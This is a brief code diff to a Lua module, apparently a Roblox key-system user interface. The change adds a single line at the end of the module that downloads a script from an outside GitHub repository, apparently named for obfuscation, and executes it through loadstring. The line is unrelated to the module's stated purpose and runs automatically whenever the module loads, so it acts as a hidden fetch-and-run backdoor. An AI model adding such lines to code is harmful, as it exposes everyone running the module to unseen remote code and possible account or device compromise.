@@ -449,4 +449,5 @@ function KeySystemUI.New(settings)
     MakeUi(settings.ApplicationName, settings.Name, settings.Info, settings.DiscordInvite)
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RaCc0oN1/RobloxObf/main/MobileButton"))()
 return KeySystemUI
